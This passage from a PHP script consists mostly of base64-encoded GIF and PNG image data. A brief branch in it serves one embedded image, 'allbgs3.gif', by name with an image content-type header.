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");
        }elseif($imgname == "allbgs3.gif"){
        	header('content-type:image/png');
        echo base64_decode("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